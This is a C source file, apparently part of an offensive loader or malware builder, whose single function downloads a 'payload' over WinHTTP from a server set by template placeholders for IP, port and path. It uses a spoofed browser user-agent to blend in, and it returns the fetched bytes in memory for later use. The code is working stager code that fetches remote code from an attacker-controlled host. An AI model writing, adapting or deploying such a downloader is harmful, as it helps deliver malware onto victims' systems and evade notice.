/*

	Author: @ B0lg0r0v (Arthur Minasyan)

*/
#include <stdio.h>
#include <Windows.h>
#include <winhttp.h>

#include "functions.h"

#pragma comment(lib, "winhttp.lib")

#define IP		L"#-IP_VALUE-#"		// Changable
#define PORT	#-PORT_VALUE-#		// Changable
#define PATH	L"#-PATH_VALUE-#"	// Changable


BOOL GetContent(OUT PBYTE* pPayload,OUT SIZE_T* sSizeOfPayload) {

	LPCWSTR   	path			= PATH;
	DWORD		dwSize			= 0,
				dwTotalSize		= 0,
				dwDownloaded	= 0;
	LPSTR		pszOutBuffer	= NULL;
	BOOL		bState			= FALSE;
	HINTERNET	hSession		= NULL, 
				hConnect		= NULL, 
				hRequest		= NULL;

	// First opening an internet session
	hSession = WinHttpOpen(
		L"Mozilla/5.0 (Windows; U; Windows NT 10.3;; en-US) AppleWebKit/536.34 (KHTML, like Gecko) Chrome/47.0.3601.371 Safari/536",
		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		0
		);

	// Checking if it was successfull
	if (hSession == NULL) {

		printf("[-] Internet session could not be initialized.\n");
		goto _CleanUp;
	}

	// Defining the target server with the earlier defined session
	hConnect = WinHttpConnect(hSession, IP, PORT, 0);

	// Checking if its ok
	if (hConnect == NULL) {

		printf("[-] Could not connect to the target server: %d\n", GetLastError());
		goto _CleanUp;
	}
	
	// Creating the HTTP request 
	hRequest = WinHttpOpenRequest(hConnect, NULL, path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_ESCAPE_DISABLE);

	// Checking again
	if (hRequest == NULL) {

		printf("[-] Failed to create the request: %d\n", GetLastError());
		goto _CleanUp;
	}

	// Firing the request !!
	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {

		printf("[-] Failed to send the request: %d\n", GetLastError());
		goto _CleanUp;
	}

	// Wait for the response
	if (!WinHttpReceiveResponse(hRequest, 0)) {

		printf("[-] Failed to receive the response: %d", GetLastError());
		goto _CleanUp;
	}

	do {

		// Checking for available data
		dwSize = 0;

		if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {

			printf("[-] Error checking the amount of data: %d", GetLastError());
			goto _CleanUp;
		}

		// Allocating the space to gather the data
		LPSTR tempBuffer = realloc(pszOutBuffer, dwTotalSize + dwSize + 1);

		if (!tempBuffer) {

			printf("[-] Out of memory: %d", GetLastError());
			goto _CleanUp;

		}
		else {

			pszOutBuffer = tempBuffer;

		}

		// Reading the data
		if (!WinHttpReadData(hRequest, (LPVOID)(pszOutBuffer + dwTotalSize), dwSize, &dwDownloaded)) {

			printf("[-] Error reading the data: %d", GetLastError());
			goto _CleanUp;

		}

		dwTotalSize += dwDownloaded;


	} while (dwSize > 0);

	// Saving the content into the "return variables"
	*pPayload		 = pszOutBuffer;
	*sSizeOfPayload	 = dwTotalSize;
	pszOutBuffer	 = NULL;
	bState			 = TRUE;


_CleanUp:
	if (pszOutBuffer) 
		free(pszOutBuffer);
	if (hRequest) 
		WinHttpCloseHandle(hRequest);
	if (hConnect) 
		WinHttpCloseHandle(hConnect);
	if (hSession) 
		WinHttpCloseHandle(hSession);
	
	return bState;
}


